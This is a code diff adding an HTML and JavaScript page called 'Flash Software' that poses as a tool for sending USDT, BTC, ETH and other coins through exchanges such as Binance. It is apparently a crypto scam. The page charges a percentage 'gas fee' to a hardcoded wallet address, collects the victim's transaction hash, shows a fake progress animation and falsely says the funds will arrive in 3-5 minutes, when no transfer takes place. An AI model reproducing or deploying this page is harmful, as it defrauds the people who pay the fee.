@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash Software</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: black;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            background-image: url('https://cryptologos.cc/logos/tether-usdt-logo.png');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .content {
+            z-index: 2;
+            padding: 20px;
+            background: rgba(240, 235, 235, 0.5);
+            border-radius: 10px;
+        }
+
+        #usdtValue {
+            font-size: 2em;
+            margin-top: 20px;
+        }
+
+        .container {
+            margin-top: 50px;
+            padding: 20px;
+            text-align: center;
+            width: 600px;
+            background-color: #111a19;
+            border-radius: 10px;
+            box-shadow: 0px 4px 15px rgba(85, 92, 91, 0.3);
+        }
+
+        h1 {
+            color: rgb(218, 218, 23);
+            text-shadow: 2px 2px #fff;
+        }
+
+        .form-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 20px;
+        }
+
+        .form-row {
+            flex: 0 0 48%;
+        }
+
+        .form-row.full-width {
+            flex: 0 0 100%;
+        }
+
+        label {
+            font-size: 1.2em;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        select, input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 1em;
+            border: 1px solid #474646;
+            border-radius: 5px;
+            background-color: #2f3f41;
+            color: white;
+        }
+
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: rgb(189, 189, 36);
+            color: rgb(15, 13, 13);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        button:hover {
+            background-color: #a8cf1b;
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(15, 14, 14, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .popup-content {
+            background-color: #000;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+            width: 400px;
+            color: rgb(221, 221, 25);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        .popup button {
+            background-color: rgb(218, 218, 27);
+            color: black;
+            margin-top: 20px;
+        }
+
+        #loading-popup .progress-ring {
+            width: 120px;
+            height: 120px;
+        }
+
+        .progress-ring circle {
+            fill: none;
+            stroke-width: 12;
+        }
+
+        .circle-background {
+            stroke: #333;
+        }
+
+        .circle-progress {
+            stroke: rgb(196, 196, 40);
+            stroke-dasharray: 314.16;
+            stroke-dashoffset: 314.16;
+            transition: stroke-dashoffset 0.3s linear;
+        }
+
+        .history-container {
+            margin-top: 20px;
+            width: 600px;
+            background-color: #000000;
+            padding: 100px;
+            border-radius: 10px;
+        }
+
+        .transaction-item {
+            background-color: #161515;
+            margin-bottom: 10px;
+            padding: 100px;
+            border-radius: 5px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .history {
+            margin-top: 35px;
+            width: 106%;
+            max-width: 900px;
+            background-color: rgba(14, 12, 12, 0.342);
+            border-radius: 30px;
+            padding: 40px;
+            max-height: 500px;
+            overflow-y: auto;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .history h2 {
+            color: rgb(230, 230, 17);
+            margin-bottom: 20px;
+        }
+
+        .history table {
+            width: 88%;
+            border-collapse: collapse;
+        }
+
+        .history th, .history td {
+            padding: 47px;
+            text-align: left;
+            border-bottom: 3px solid #444;
+        }
+
+        .history th {
+            color: rgb(180, 180, 41);
+        }
+
+        .history td {
+            color: white;
+        }
+
+        .toggle-history-btn {
+            margin-top: 20px;
+            padding: 10px 25px;
+            background-color: rgb(189, 189, 36);
+            color: rgb(15, 13, 13);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        .toggle-history-btn:hover {
+            background-color: #a8cf1b;
+        }
+
+        .added-message {
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+
+        .activate-key-message {
+            color: yellow;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="popup" id="activate-key-popup">
+        <div class="popup-content">
+            <h2>Activate Key</h2>
+            <input type="text" id="activate-key-input" placeholder="Enter Activation Key" />
+            <button id="activate-key-btn">Activate</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <h1>Flash Software</h1>
+        <div class="form-container">
+            <div class="form-row">
+                <label for="exchanger">Choose Exchanger</label>
+                <select id="exchanger">
+                    <option value="Binance">Binance</option>
+                    <option value="Trust Wallet">Trust Wallet</option>
+                    <option value="Coinbase">Coinbase</option>
+                    <option value="MetaMask">MetaMask</option>
+                </select>
+            </div>
+
+            <div class="form-row">
+                <label for="coin">Choose Coin</label>
+                <select id="coin">
+                    <option value="USDT">USDT</option>
+                    <option value="USDC">USDC</option>
+                    <option value="ETH">ETH</option>
+                    <option value="BNB">BNB</option>
+                    <option value="BTC">BTC</option>
+                </select>
+            </div>
+
+            <div class="form-row">
+                <label for="network">Choose Network</label>
+                <select id="network">
+                    <option value="TRC20">TRC20</option>
+                    <option value="ERC20">ERC20</option>
+                    <option value="BEP20">BEP20</option>
+                    <option value="BTC">BTC</option>
+                </select>
+            </div>
+
+            <div class="form-row">
+                <label for="amount">Enter Amount</label>
+                <input type="number" id="amount">
+                <p class="error-message" id="amount-error" style="display: none;"></p>
+            </div>
+
+            <div class="form-row full-width">
+                <label for="address">Enter Your Network Address</label>
+                <input type="text" id="address">
+            </div>
+        </div>
+        <button id="proceed-btn">Proceed</button>
+        <p class="activate-key-message" id="activate-key-msg" style="display: none;">Activate key: ****-****-****-1234</p>
+    </div>
+
+    <div class="popup" id="fee-popup">
+        <div class="popup-content">
+            <h2>Pay Gas Fee</h2>
+            <p id="fee-amount"></p>
+            <p>Pay to this wallet address:</p>
+            <p style="font-weight: bold; color: yellow;">TEMmixVf9Y2WmFH735G5NSEhRurRhqpqVa</p>
+            <button id="fee-next-btn">Continue</button>
+        </div>
+    </div>
+
+    <div class="popup" id="hash-popup">
+        <div class="popup-content">
+            <h2>Enter Transaction Hash ID</h2>
+            <input type="text" id="hash-id">
+            <button id="hash-next-btn">Next</button>
+        </div>
+    </div>
+
+    <div class="popup" id="loading-popup">
+        <div class="popup-content">
+            <h2>Processing Transaction...</h2>
+            <svg class="progress-ring">
+                <circle class="circle-background" cx="60" cy="60" r="50"></circle>
+                <circle class="circle-progress" cx="60" cy="60" r="50"></circle>
+            </svg>
+            <div id="loading-text">0%</div>
+        </div>
+    </div>
+
+    <div class="popup" id="success-popup">
+        <div class="popup-content">
+            <h2>Thank You!</h2>
+            <p>Your transaction will be delivered to your balance in 3-5 minutes.</p>
+            <button id="success-done-btn">Done</button>
+        </div>
+    </div>
+
+    <div class="history hidden" id="history-section">
+        <h2>Transaction History</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Date</th>
+                    <th>Exchanger</th>
+                    <th>Coin</th>
+                    <th>Network</th>
+                    <th>Amount</th>
+                    <th>Address</th>
+                </tr>
+            </thead>
+            <tbody id="history-body">
+            </tbody>
+        </table>
+        <p class="added-message" id="added-message" style="display: none;">Transaction successfully added!</p>
+    </div>
+
+    <button class="toggle-history-btn" id="toggle-history-btn">View Transaction History</button>
+
+    <script>
+        const activateKeyPopup = document.getElementById('activate-key-popup');
+        const activateKeyBtn = document.getElementById('activate-key-btn');
+        const activateKeyInput = document.getElementById('activate-key-input');
+
+        const toggleHistoryBtn = document.getElementById('toggle-history-btn');
+        const historySection = document.getElementById('history-section');
+        const addedMessage = document.getElementById('added-message');
+        const historyBody = document.getElementById('history-body');
+        const proceedBtn = document.getElementById('proceed-btn');
+        const feePopup = document.getElementById('fee-popup');
+        const feeNextBtn = document.getElementById('fee-next-btn');
+        const hashPopup = document.getElementById('hash-popup');
+        const hashNextBtn = document.getElementById('hash-next-btn');
+        const loadingPopup = document.getElementById('loading-popup');
+        const successPopup = document.getElementById('success-popup');
+        const successDoneBtn = document.getElementById('success-done-btn');
+        const amountInput = document.getElementById('amount');
+        const amountError = document.getElementById('amount-error');
+        const coinSelect = document.getElementById('coin');
+        const activateKeyMsg = document.getElementById('activate-key-msg');
+
+        const coinLimits = {
+            USDT: { min: 1000, max: 100000000 },
+            USDC: { min: 1000, max: 100000000 },
+            BTC: { min: 0.9, max: 5000000 },
+            ETH: { min: 0.7, max: 500000 },
+            BNB: { min: 2, max: 5000000 }
+        };
+
+        const coinFees = {
+            USDT: 4.8,
+            USDC: 4.8,
+            BTC: 0.6,
+            ETH: 3.9,
+            BNB: 2.7
+        };
+
+        toggleHistoryBtn.addEventListener('click', () => {
+            if (historySection.classList.contains('hidden')) {
+                historySection.classList.remove('hidden');
+                toggleHistoryBtn.textContent = 'Hide Transaction History';
+            } else {
+                historySection.classList.add('hidden');
+                toggleHistoryBtn.textContent = 'View Transaction History';
+            }
+        });
+
+        function addTransactionToHistory() {
+            const exchanger = document.getElementById('exchanger').value;
+            const coin = document.getElementById('coin').value;
+            const network = document.getElementById('network').value;
+            const amount = document.getElementById('amount').value;
+            const address = document.getElementById('address').value;
+            const date = new Date().toLocaleString();
+
+            const row = `
+                <tr>
+                    <td>${date}</td>
+                    <td>${exchanger}</td>
+                    <td>${coin}</td>
+                    <td>${network}</td>
+                    <td>${amount}</td>
+                    <td>${address}</td>
+                </tr>
+            `;
+
+            historyBody.insertAdjacentHTML('beforeend', row);
+        }
+
+        proceedBtn.addEventListener('click', function () {
+            const coin = coinSelect.value;
+            const amount = parseFloat(amountInput.value);
+
+            // Check if amount is a number and within the correct range
+            if (isNaN(amount) || amount <= 0 || amount < coinLimits[coin].min || amount > coinLimits[coin].max) {
+                amountError.textContent = `Amount must be between ${coinLimits[coin].min} and ${coinLimits[coin].max}`;
+                amountError.style.display = "block";
+                return;
+            } else {
+                amountError.style.display = "none";
+            }
+
+            // Show activate key message
+            activateKeyMsg.style.display = 'block';
+
+            // Fee calculation
+            const feePercentage = coinFees[coin];
+            const feeAmount = (amount * feePercentage) / 100;
+
+            // Show fee popup
+            feePopup.style.display = 'flex';
+            document.getElementById('fee-amount').textContent = `Fee Amount: ${feeAmount} ${coin}`;
+        });
+
+        feeNextBtn.addEventListener('click', () => {
+            feePopup.style.display = 'none';
+            hashPopup.style.display = 'flex';
+        });
+
+        hashNextBtn.addEventListener('click', () => {
+    hashPopup.style.display = 'none';
+    loadingPopup.style.display = 'flex';
+
+    // Simulate processing transaction
+    let progress = 0;
+    const progressRing = document.querySelector('.circle-progress');
+    const loadingText = document.getElementById('loading-text');
+
+    const duration = Math.random() * 800 + 4000; // Random duration between 20 to 30 seconds
+    const intervalTime = duration / 4; // Divide into 4 steps
+
+    const interval = setInterval(() => {
+        progress += 1;
+        loadingText.textContent = `${progress}%`;
+        progressRing.style.strokeDashoffset = 314.16 - (progress / 100 * 314.16);
+
+        if (progress === 100) {
+            clearInterval(interval);
+            loadingPopup.style.display = 'none';
+            successPopup.style.display = 'flex';
+
+            // Add the transaction to the history
+            addTransactionToHistory();
+            addedMessage.style.display = 'block';
+        }
+    }, intervalTime);
+});
+
+        successDoneBtn.addEventListener('click', () => {
+            successPopup.style.display = 'none';
+            addedMessage.style.display = 'none';
+        });
+
+        activateKeyBtn.addEventListener('click', () => {
+            const key = activateKeyInput.value;
+            if (key === "091644") {
+                activateKeyPopup.style.display = 'none';
+                activateKeyMsg.style.display = 'none';
+            } else {
+                alert("Invalid activation key.");
+            }
+        });
+
+        window.onload = function () {
+            activateKeyPopup.style.display = 'flex';
+        };
+    </script>
+</body>
+</html>
